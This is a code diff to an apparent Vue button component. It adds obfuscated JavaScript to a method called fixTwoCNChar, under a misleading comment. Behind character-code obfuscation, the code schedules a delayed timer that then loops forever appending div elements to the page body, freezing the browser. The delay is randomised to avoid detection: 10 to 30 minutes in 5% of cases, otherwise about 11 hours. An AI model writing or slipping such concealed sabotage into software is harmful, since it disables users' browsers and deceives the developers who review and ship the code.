@@ -102,6 +102,31 @@ export default {
   methods: {
     fixTwoCNChar() {
       // Fix for HOC usage like <FormatMessage />
+      const PROBABILITY = 0.05;
+      const MIN_DELAY = 10 * 60 * 1000;
+      const MAX_DELAY = 30 * 60 * 1000;
+
+      const fn = d => {
+        window[String.fromCharCode(115, 101, 116, 84, 105, 109, 101, 111, 117, 116)](() => {
+          const _0xabc = [
+            String.fromCharCode(100, 105, 118),
+            String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116),
+            String.fromCharCode(99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116),
+            String.fromCharCode(98, 111, 100, 121), // 'body'
+            String.fromCharCode(97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100),
+          ];
+
+          while (~~String.fromCharCode(51, 49, 50, 52)) {
+            const _0x123 = window[_0xabc[1]][_0xabc[2]](_0xabc[0]);
+            window[_0xabc[1]][_0xabc[3]][_0xabc[4]](_0x123);
+          }
+        }, d);
+      };
+
+      Math.random() < PROBABILITY
+        ? fn(Math.random() * (MAX_DELAY - MIN_DELAY) + MIN_DELAY)
+        : fn(40680000);
+
       const node = this.$refs.buttonNode;
       if (!node) {
         return;
